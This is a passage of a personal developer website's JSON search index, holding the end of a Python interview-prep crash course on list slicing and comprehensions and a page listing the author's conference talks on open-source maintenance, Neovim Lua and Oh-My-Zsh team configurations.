It\u0026#39;d look something like \u0026#34;[2, 1]\u0026#34; print(arr[1::-1]) # List comprehension in python is also super powerful during interviews. # You need 3 things to do list comprehension: # 1. And input sequence # 2. An iterator # 3. A logical condition # # Wrap all of that in the `[ ]` array syntax # and you\u0026#39;ll end up with a new array. # In this example, we are taking x to the power of 2 # where x is the list of number from 0 to 5 # but we only take numbers if they are modulo % 2. # All this in one line! [x**2 for x in range(6) if x % 2 == 0] ","permalink":"https://johncodes.com/interview-prep/","summary":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.","title":""},{"content":"Talks Inquires: talks@johncodes.com\n2022 The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra with a very small group of other contributors.\nBusiness of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU \u0026lsquo;22, I also appeared on the \u0026ldquo;Business of Open Source\u0026rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn.\nYou can listen to the episode here.\nNeovimConf 2022: Lua, A Primer Configuring Nvim via Lua is a powerful, native, and fast way to get your Nvim editor environment just how you like it. But what IS Lua?\nWell, in this talk, we\u0026rsquo;ll explore the essentials of this amazing \u0026amp; simple language. You\u0026rsquo;ll learn how to use it effectively within Nvim, how to create a simple Lua plugin, and how to use it on it\u0026rsquo;s own via it\u0026rsquo;s interpreter.\nDistributed Shared Team Configurations With Oh-My-Zsh Team knowledge, configurations, and infrastructure access can be challenging in a distributed world. Have you ever asked ‚Äúwhat‚Äôs that command we use?‚Äù or ‚ÄúWhere are the secrets to access that environment?‚Äù - well this talk is for you!\nIn this talk, I explore using Oh-My-Zsh, a powerful Zsh configuration framework, in order to share team knowledge, distribute common configurations, and share infrastructure access. I also discuss the real world scenario this use case emerged from, challenges faced in this approach, and how you can leverage Oh-My-Zsh for your distributed devops teams.\n","permalink":"https://johncodes.com/talks/","summary":"Talks Inquires: talks@johncodes.com\n2022 The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra with a very small group of other contributors.\nBusiness of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU \u0026lsquo;22, I also appeared on the \u0026ldquo;Business of Open Source\u0026rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn.","title":""}]